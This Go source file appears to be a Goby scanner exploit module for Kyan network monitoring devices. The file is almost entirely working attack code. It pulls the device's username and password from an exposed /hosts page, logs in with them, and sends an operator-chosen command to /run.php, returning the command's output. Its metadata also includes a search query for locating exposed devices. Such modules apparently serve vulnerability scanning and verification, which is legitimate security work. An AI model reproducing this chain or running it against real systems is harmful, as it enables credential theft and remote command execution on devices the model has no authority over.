package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Kyan Network monitoring Password Leakage And run.php RCE",
    "Description": "Kyan network monitoring device run.php can execute arbitrary commands in the case of identity authentication. With the account and password leakage vulnerability, it can obtain server permissions, and there is a remote command execution vulnerability",
    "Product": "Kyan Network monitoring",
    "Homepage": "http://www.kyanmedia.com",
    "DisclosureDate": "2021-06-05",
    "Author": "PeiQi",
    "GobyQuery": "app=\"KYAN design\"",
    "Level": "3",
    "Impact": "<p>it can obtain server permissions, and there is a remote command execution vulnerability</p>",
    "Recommendation": "<p>Strictly filter the data input by users and prohibit the execution of unexpected system commands</p>",
    "References": [
        "https://fofa.so"
    ],
    "HasExp": true,
    "ExpParams": [
        {
            "name": "Cmd",
            "type": "input",
            "value": "id"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND"
    ],
    "ExploitSteps": null,
    "Tags": [
        "RCE"
    ],
    "CVEIDs": null,
    "CVSSScore": "0.0",
    "AttackSurfaces": {
        "Application": [
            "Kyan Network monitoring"
        ],
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Disable": false,
    "PocId": "10210"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			uri := "/hosts"
			cfg := httpclient.NewGetRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Header.Store("Content-type", "application/x-www-form-urlencoded")
			if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil {
				if resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, "Password") {
					UserName := regexp.MustCompile(`^UserName=(.*)`).FindStringSubmatch(resp.Utf8Html)[1]
					Password := regexp.MustCompile(`Password=(.*)`).FindStringSubmatch(resp.Utf8Html)[1]
					Cookie_Login := goutils.RandomHexString(26)
					uri_1 := "/login.php"
					cfg_1 := httpclient.NewPostRequestConfig(uri_1)
					cfg_1.VerifyTls = false
					cfg_1.FollowRedirect = false
					cfg_1.Header.Store("Cookie", "PHPSESSID="+Cookie_Login)
					cfg_1.Header.Store("Content-type", "application/x-www-form-urlencoded")
					cfg_1.Data = "user=" + UserName + "&passwd=" + Password
					if resp, err := httpclient.DoHttpRequest(u, cfg_1); err == nil {
						if resp.StatusCode == 302 {
							uri_2 := "/run.php"
							cfg_2 := httpclient.NewPostRequestConfig(uri_2)
							cfg_2.VerifyTls = false
							cfg_2.FollowRedirect = false
							cfg_2.Header.Store("Cookie", "PHPSESSID="+Cookie_Login)
							cfg_2.Header.Store("Content-type", "application/x-www-form-urlencoded")
							cfg_2.Data = "command=id"
							if resp, err := httpclient.DoHttpRequest(u, cfg_2); err == nil {
								return resp.StatusCode == 200 && strings.Contains(resp.RawBody, "uid")
							}
						}
					}
				}
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			uri := "/hosts"
			cfg := httpclient.NewGetRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Header.Store("Content-type", "application/x-www-form-urlencoded")
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
				if resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, "Password") {
					UserName := regexp.MustCompile(`^UserName=(.*)`).FindStringSubmatch(resp.Utf8Html)[1]
					Password := regexp.MustCompile(`Password=(.*)`).FindStringSubmatch(resp.Utf8Html)[1]
					Cookie_Login := goutils.RandomHexString(26)
					uri_1 := "/login.php"
					cfg_1 := httpclient.NewPostRequestConfig(uri_1)
					cfg_1.VerifyTls = false
					cfg_1.FollowRedirect = false
					cfg_1.Header.Store("Cookie", "PHPSESSID="+Cookie_Login)
					cfg_1.Header.Store("Content-type", "application/x-www-form-urlencoded")
					cfg_1.Data = "user=" + UserName + "&passwd=" + Password
					if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg_1); err == nil {
						if resp.StatusCode == 302 {
							cmd := ss.Params["Cmd"].(string)
							uri_2 := "/run.php"
							cfg_2 := httpclient.NewPostRequestConfig(uri_2)
							cfg_2.VerifyTls = false
							cfg_2.FollowRedirect = false
							cfg_2.Header.Store("Cookie", "PHPSESSID="+Cookie_Login)
							cfg_2.Header.Store("Content-type", "application/x-www-form-urlencoded")
							cfg_2.Data = "command=" + cmd
							if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg_2); err == nil {
								Data := regexp.MustCompile(`readonly>([\s\S]+)</textarea>`).FindStringSubmatch(resp.Utf8Html)[1]
								expResult.Output = Data
								expResult.Success = true
							}
						}
					}
				}
			}
			return expResult
		},
	))
}
